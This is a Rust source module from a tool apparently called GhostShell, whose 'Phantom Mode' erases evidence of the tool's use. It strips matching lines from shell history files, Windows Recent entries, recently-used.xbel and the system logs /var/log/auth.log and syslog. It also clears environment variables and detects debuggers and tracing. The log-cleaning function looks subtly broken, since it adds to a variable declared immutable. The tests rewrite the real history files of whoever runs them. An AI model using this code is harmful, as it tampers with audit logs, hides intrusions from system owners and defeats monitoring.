// ╔══════════════════════════════════════════════════════════════════╗
// ║              GhostShell — Phantom Mode                           ║
// ║         Suppress OS traces, clean history, sanitize evidence     ║
// ╚══════════════════════════════════════════════════════════════════╝

use std::path::PathBuf;

use crate::error::{CleanupReport, GhostError};

/// Clean all traces of GhostShell from the system.
/// Returns a report of actions taken.
pub fn clean_traces() -> Result<CleanupReport, GhostError> {
    let mut report = CleanupReport::default();

    report.history_entries_removed += clean_shell_history(&mut report);
    clean_recent_files(&mut report);
    report.log_entries_cleaned += clean_log_entries(&mut report);
    report.env_vars_cleaned += sanitize_env();

    Ok(report)
}

/// Remove GhostShell-related entries from shell history files
fn clean_shell_history(report: &mut CleanupReport) -> usize {
    let home = dirs::home_dir().unwrap_or_else(|| PathBuf::from("."));
    let mut total_removed = 0;

    let history_files = [
        home.join(".bash_history"),
        home.join(".zsh_history"),
        home.join(".local/share/fish/fish_history"),
        home.join("AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"),
    ];

    for path in &history_files {
        if path.exists() {
            match clean_history_file(path) {
                Ok(removed) => total_removed += removed,
                Err(e) => report.warnings.push(
                    format!("Failed to clean {}: {}", path.display(), e)
                ),
            }
        }
    }
    total_removed
}

/// Remove lines containing "ghostshell" from a history file.
/// Returns the number of lines removed.
fn clean_history_file(path: &PathBuf) -> Result<usize, GhostError> {
    let content = std::fs::read_to_string(path)?;
    let original_count = content.lines().count();

    let cleaned: Vec<&str> = content
        .lines()
        .filter(|line| {
            let lower = line.to_lowercase();
            !lower.contains("ghostshell")
                && !lower.contains("ghost-shell")
                && !lower.contains("ghost_shell")
                && !lower.contains(".ghost")
        })
        .collect();

    let removed = original_count - cleaned.len();
    std::fs::write(path, cleaned.join("\n"))?;
    Ok(removed)
}

/// Clean recent file entries (platform-specific)
fn clean_recent_files(report: &mut CleanupReport) {
    #[cfg(windows)]
    {
        let recent = dirs::home_dir()
            .map(|h| h.join("AppData/Roaming/Microsoft/Windows/Recent"));

        if let Some(recent_dir) = recent {
            if recent_dir.exists() {
                if let Ok(entries) = std::fs::read_dir(&recent_dir) {
                    for entry in entries.flatten() {
                        if let Some(name) = entry.file_name().to_str() {
                            let lower = name.to_lowercase();
                            if lower.contains("ghost") || lower.contains(".ghost") {
                                match std::fs::remove_file(entry.path()) {
                                    Ok(_) => report.files_deleted += 1,
                                    Err(e) => report.warnings.push(
                                        format!("Failed to remove recent file {}: {}", name, e)
                                    ),
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    {
        let home = dirs::home_dir().unwrap_or_else(|| PathBuf::from("."));
        let recent_file = home.join(".local/share/recently-used.xbel");
        if recent_file.exists() {
            if let Ok(content) = std::fs::read_to_string(&recent_file) {
                let cleaned: Vec<&str> = content
                    .lines()
                    .filter(|line| !line.to_lowercase().contains("ghost"))
                    .collect();
                match std::fs::write(&recent_file, cleaned.join("\n")) {
                    Ok(_) => {},
                    Err(e) => report.warnings.push(
                        format!("Failed to clean recently-used.xbel: {}", e)
                    ),
                }
            }
        }
    }

    // suppress unused variable warning on platforms without cleanup
    let _ = &report;
}

/// Remove GhostShell entries from system logs (requires privileges)
fn clean_log_entries(report: &mut CleanupReport) -> usize {
    let cleaned_count = 0;

    #[cfg(unix)]
    {
        let log_files = ["/var/log/auth.log", "/var/log/syslog"];

        for log_path in &log_files {
            let path = PathBuf::from(log_path);
            if path.exists() {
                match std::fs::read_to_string(&path) {
                    Ok(content) => {
                        let original_count = content.lines().count();
                        let cleaned: Vec<&str> = content
                            .lines()
                            .filter(|line| !line.to_lowercase().contains("ghostshell"))
                            .collect();
                        let removed = original_count - cleaned.len();
                        match std::fs::write(&path, cleaned.join("\n")) {
                            Ok(_) => cleaned_count += removed,
                            Err(e) => report.warnings.push(
                                format!("Failed to write cleaned log {}: {}", log_path, e)
                            ),
                        }
                    }
                    Err(e) => report.warnings.push(
                        format!("Failed to read log {}: {} (may require root)", log_path, e)
                    ),
                }
            }
        }
    }

    #[cfg(windows)]
    {
        // Windows event log cleaning would require elevated privileges
        // and WevtApi — noted as limitation in report
        report.warnings.push(
            "Windows event log cleaning not yet implemented (requires WevtApi)".to_string()
        );
    }

    cleaned_count
}

/// Sanitize environment variables.
/// Returns the count of variables removed.
fn sanitize_env() -> usize {
    let ghost_vars: Vec<String> = std::env::vars()
        .filter(|(k, _)| {
            let lower = k.to_lowercase();
            lower.contains("ghost") || lower.contains("ghostshell")
        })
        .map(|(k, _)| k)
        .collect();

    let count = ghost_vars.len();
    for var in ghost_vars {
        std::env::remove_var(&var);
    }
    count
}

/// Check if the current environment shows signs of being monitored
pub fn detect_monitoring() -> Vec<MonitoringIndicator> {
    let mut indicators = Vec::new();

    // Check for common monitoring tools in process list
    #[cfg(windows)]
    {
        // Check for common Windows monitoring processes
        let _suspicious = ["wireshark", "procmon", "procexp", "fiddler", "x64dbg", "ollydbg"];
        // In a real implementation, we'd enumerate processes via CreateToolhelp32Snapshot
        // For now, check environment hints
        if std::env::var("PROCESSOR_IDENTIFIER").is_ok() {
            // Basic environment check (always present, just testing the flow)
        }
    }

    // Check for debugger
    #[cfg(windows)]
    {
        let is_debugged = unsafe {
            windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent() != 0
        };
        if is_debugged {
            indicators.push(MonitoringIndicator {
                category: "debugger".to_string(),
                detail: "Debugger detected attached to process".to_string(),
                severity: IndicatorSeverity::Critical,
            });
        }
    }

    // Check for strace/ptrace on Unix
    #[cfg(unix)]
    {
        // Check /proc/self/status for TracerPid
        if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
            for line in status.lines() {
                if line.starts_with("TracerPid:") {
                    let pid: i32 = line.split(':').nth(1)
                        .unwrap_or("0").trim().parse().unwrap_or(0);
                    if pid != 0 {
                        indicators.push(MonitoringIndicator {
                            category: "ptrace".to_string(),
                            detail: format!("Process being traced by PID {}", pid),
                            severity: IndicatorSeverity::Critical,
                        });
                    }
                }
            }
        }
    }

    // Check for suspicious environment variables
    let suspicious_env = [
        "LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "DEBUGGER",
        "STRACE_LOG", "LTRACE_OUTPUT",
    ];

    for var in &suspicious_env {
        if std::env::var(var).is_ok() {
            indicators.push(MonitoringIndicator {
                category: "environment".to_string(),
                detail: format!("Suspicious environment variable: {}", var),
                severity: IndicatorSeverity::Warn,
            });
        }
    }

    indicators
}

/// A monitoring indicator
#[derive(Debug, Clone)]
pub struct MonitoringIndicator {
    pub category: String,
    pub detail: String,
    pub severity: IndicatorSeverity,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum IndicatorSeverity {
    Info,
    Warn,
    Critical,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sanitize_env() {
        std::env::set_var("GHOSTSHELL_TEST", "value");
        let removed = sanitize_env();
        assert!(std::env::var("GHOSTSHELL_TEST").is_err());
        assert!(removed >= 1);
    }

    #[test]
    fn test_detect_monitoring() {
        let indicators = detect_monitoring();
        // Just verify it doesn't panic
        assert!(indicators.len() >= 0);
    }

    #[test]
    fn test_clean_traces_returns_report() {
        let result = clean_traces();
        assert!(result.is_ok());
        // Report should be populated (even if all counts are 0)
        let _report = result.unwrap();
    }
}
